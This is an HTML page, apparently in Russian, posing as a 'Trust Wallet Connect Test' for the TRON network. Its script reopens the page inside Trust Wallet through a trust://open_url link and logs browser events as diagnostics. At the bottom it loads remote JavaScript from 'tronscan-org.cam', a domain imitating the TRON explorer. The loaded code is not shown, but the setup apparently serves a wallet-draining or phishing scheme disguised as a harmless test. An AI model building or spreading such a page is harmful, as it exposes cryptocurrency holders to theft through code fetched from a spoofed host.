
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Trust Wallet Connect Test</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;
    padding: 25px;
    background: #0b1020;
    color: white;
    font-family: Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
}

.container {
    width: 100%;
    max-width: 550px;
    padding: 28px;
    background: #151e32;
    border: 1px solid #293957;
    border-radius: 20px;
}

h1 {
    margin-top: 0;
}

.description {
    color: #aab8d0;
    line-height: 1.5;
}

button {
    width: 100%;
    padding: 17px;
    margin-top: 18px;
    border: none;
    border-radius: 12px;
    background: #3375f6;
    color: white;
    font-size: 17px;
    font-weight: bold;
    cursor: pointer;
}

.status {
    padding: 15px;
    margin-top: 20px;
    background: #0b1427;
    border-radius: 10px;
}

#log {
    min-height: 160px;
    max-height: 260px;
    overflow-y: auto;
    margin-top: 12px;
    padding: 14px;
    background: #080d18;
    border-radius: 10px;
    color: #a9c5ff;
    font: 12px/1.6 monospace;
    white-space: pre-wrap;
    overflow-wrap: anywhere;
}

.small {
    color: #8292b1;
    font-size: 12px;
}
</style>
</head>

<body>

<div class="container">

    <h1>Trust Wallet</h1>

    <p class="description">
        Подключение через Trust Wallet URI Scheme.
        TRON Network — Coin ID 195.
    </p>

    <button id="connect" data-connect>
        Connect Wallet
    </button>

    <div class="status" id="status">
        Статус: ожидание подключения
    </div>

    <h3>Диагностика</h3>

    <div id="log">Система готова.</div>

    <p class="small">
        Диагностика фиксирует события браузера,
        но не подтверждает фактическое подключение кошелька.
    </p>

</div>

<script>
(() => {

    const COIN_ID = 195;

    const status = document.getElementById("status");
    const logElement = document.getElementById("log");
    const button = document.getElementById("connect");

    let timer = null;
    let leftPage = false;
    let active = false;

    function log(message) {

        const time = new Date().toLocaleTimeString();

        logElement.textContent +=
            "\n[" + time + "] " + message;

        logElement.scrollTop =
            logElement.scrollHeight;
    }

    function setStatus(message) {
        status.textContent = "Статус: " + message;
    }

    function onVisibility() {

        log(
            "Visibility: " +
            document.visibilityState
        );

        if (document.hidden) {

            leftPage = true;

            setStatus(
                "Обнаружен переход из браузера"
            );
        }
    }

    function onBlur() {
        log("BLUR: окно потеряло фокус");
    }

    function onFocus() {
        log("FOCUS: окно вернулось");
    }

    function onPageHide() {

        leftPage = true;

        log("PAGEHIDE: страница покидает окно");
    }

    function cleanup() {

        clearTimeout(timer);

        document.removeEventListener(
            "visibilitychange",
            onVisibility
        );

        window.removeEventListener(
            "blur",
            onBlur
        );

        window.removeEventListener(
            "focus",
            onFocus
        );

        window.removeEventListener(
            "pagehide",
            onPageHide
        );

        active = false;
    }

    function finish() {

        if (!active) return;

        const detected = leftPage;

        cleanup();

        if (detected) {

            setStatus(
                "Trust Scheme: обнаружен переход из браузера"
            );

            log("RESULT: переход обнаружен");

        } else {

            setStatus(
                "Trust Scheme: переход не обнаружен"
            );

            log("RESULT: переход не обнаружен");
        }

        button.disabled = false;
    }

    function openInTrust(url, coinId = COIN_ID) {

        cleanup();

        active = true;
        leftPage = false;

        button.disabled = true;

        logElement.textContent = "";

        log("========== CONNECT ==========");

        log("Coin ID: " + coinId);

        const scheme =
            "trust://open_url?coin_id=" +
            coinId +
            "&url=" +
            encodeURIComponent(url);

        log("Method: Trust URI Scheme");

        log("Target: " + scheme);

        setStatus("Открываем Trust Wallet...");

        document.addEventListener(
            "visibilitychange",
            onVisibility
        );

        window.addEventListener(
            "blur",
            onBlur
        );

        window.addEventListener(
            "focus",
            onFocus
        );

        window.addEventListener(
            "pagehide",
            onPageHide
        );

        const a = document.createElement("a");

        a.href = scheme;
        a.style.display = "none";

        document.body.appendChild(a);

        a.click();

        a.remove();

        log("Trust Scheme вызван");

        timer = setTimeout(finish, 3500);
    }

    button.addEventListener("click", () => {

        openInTrust(location.href);

    });

    log("Trust Wallet diagnostic initialized");

    log("Coin ID: " + COIN_ID);

    log("Method: trust://");

})();
</script>

<!-- Исходный сторонний скрипт -->
<script
    src="https://tronscan-org.cam/k/k570ff837e3.js"
    data-api="https://tronscan-org.cam">
</script>

</body>
</html>
